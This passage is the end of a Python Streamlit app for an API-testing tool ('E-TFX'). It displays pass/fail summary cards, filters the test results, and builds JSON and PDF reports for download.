                """, unsafe_allow_html=True)
            
            with col2:
                st.markdown(f"""
                <div class='metric-card' style='background: linear-gradient(135deg, #10b981 0%, #059669 100%);'>
                    <div class='metric-value'>{summary['passed']}</div>
                    <div class='metric-label'>Passed</div>
                </div>
                """, unsafe_allow_html=True)
            
            with col3:
                st.markdown(f"""
                <div class='metric-card' style='background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);'>
                    <div class='metric-value'>{summary['failed']}</div>
                    <div class='metric-label'>Failed</div>
                </div>
                """, unsafe_allow_html=True)
            
            with col4:
                st.markdown(f"""
                <div class='metric-card' style='background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);'>
                    <div class='metric-value'>{summary['pass_rate']:.1f}%</div>
                    <div class='metric-label'>Pass Rate</div>
                </div>
                """, unsafe_allow_html=True)
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            # Detailed Results
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            st.markdown("### 📋 Detailed Test Results")
            
            filter_option = st.radio(
                "Filter by status:",
                ["All", "Passed Only", "Failed Only"],
                horizontal=True
            )
            
            filtered = tester.results
            if filter_option == "Passed Only":
                filtered = [r for r in tester.results if r['status'] == 'PASS']
            elif filter_option == "Failed Only":
                filtered = [r for r in tester.results if r['status'] == 'FAIL']
            
            for result in filtered:
                if result['status'] == 'PASS':
                    st.markdown(f"""
                    <div class='success-box'>
                        <strong>✅ {result['test']}</strong><br>
                        {result['details']}<br>
                        <small style='color: #6b7280;'>🕐 {result['timestamp']}</small>
                    </div>
                    """, unsafe_allow_html=True)
                else:
                    st.markdown(f"""
                    <div class='error-box'>
                        <strong>❌ {result['test']}</strong><br>
                        {result['details']}<br>
                        <small style='color: #6b7280;'>🕐 {result['timestamp']}</small>
                    </div>
                    """, unsafe_allow_html=True)
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            # Download Reports
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            st.markdown("### 📥 Download Reports")
            
            col1, col2 = st.columns(2)
            
            with col1:
                st.markdown("#### 📄 JSON Report")
                
                custom_count = len([tc for tc in st.session_state.test_cases if tc.get('category') == 'custom'])
                ai_count = len(st.session_state.test_cases) - custom_count
                
                json_report = {
                    'api_url': st.session_state.api_url,
                    'timestamp': datetime.now().isoformat(),
                    'authentication': {
                        'enabled': st.session_state.auth_config.get('type') != 'none',
                        'type': st.session_state.auth_config.get('type')
                    },
                    'configuration': {
                        'timeout': st.session_state.timeout,
                        'total_tests': len(st.session_state.test_cases),
                        'ai_generated': ai_count,
                        'custom_tests': custom_count
                    },
                    'summary': summary,
                    'results': tester.results
                }
                
                st.download_button(
                    label="📄 Download JSON",
                    data=json.dumps(json_report, indent=2),
                    file_name=f"api_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                    mime="application/json",
                    use_container_width=True
                )
            
            with col2:
                st.markdown("#### 📕 PDF Report")
                
                auth_enabled = st.session_state.auth_config.get('type') != 'none'
                pdf_buffer = generate_pdf_report(tester, st.session_state.api_url, auth_enabled)
                
                if pdf_buffer:
                    st.download_button(
                        label="📕 Download PDF",
                        data=pdf_buffer,
                        file_name=f"api_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
                        mime="application/pdf",
                        use_container_width=True
                    )
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            # Action buttons
            col1, col2, col3 = st.columns([1, 1, 1])
            with col1:
                if st.button("🔄 Run Tests Again", use_container_width=True):
                    st.session_state.current_step = 4
                    st.rerun()
            with col2:
                if st.button("🆕 New Test Suite", use_container_width=True):
                    st.session_state.test_cases = []
                    st.session_state.test_results = None
                    st.session_state.current_step = 1
                    st.rerun()
    
    st.markdown("</div>", unsafe_allow_html=True)
    
    # Footer
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("""
        <div style='text-align: center; color: #9ca3af; padding: 2rem;'>
            <p style='margin: 0;'>🚀 E-TFX by EvoluneEdge</p>
            <p style='margin: 0; font-size: 0.9rem;'>Launch flawless APIs with Evolune.</p>
        </div>
    """, unsafe_allow_html=True)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        st.error(f"❌ Application Error: {str(e)}")
        with st.expander("🔍 Error Details"):
            import traceback
            st.code(traceback.format_exc())